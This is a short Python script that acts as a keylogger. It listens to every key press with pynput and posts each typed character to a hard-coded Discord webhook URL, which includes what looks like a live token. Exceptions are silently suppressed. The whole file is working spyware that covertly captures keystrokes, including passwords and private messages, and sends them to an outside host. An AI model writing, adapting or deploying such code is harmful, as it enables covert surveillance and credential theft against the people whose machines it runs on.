from pynput import keyboard
import requests

webhook_url = "https://discord.com/api/webhooks/1401762562692874281/HZkLWQIuIE7voLmc04GjxEhpOIayWv1xIkPGDX6dB4AghXF8EAomLoWiLkgLdvSwV80V"

def on_press(key):
    try:
        requests.post(webhook_url, data={"content": str(key.char)})
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
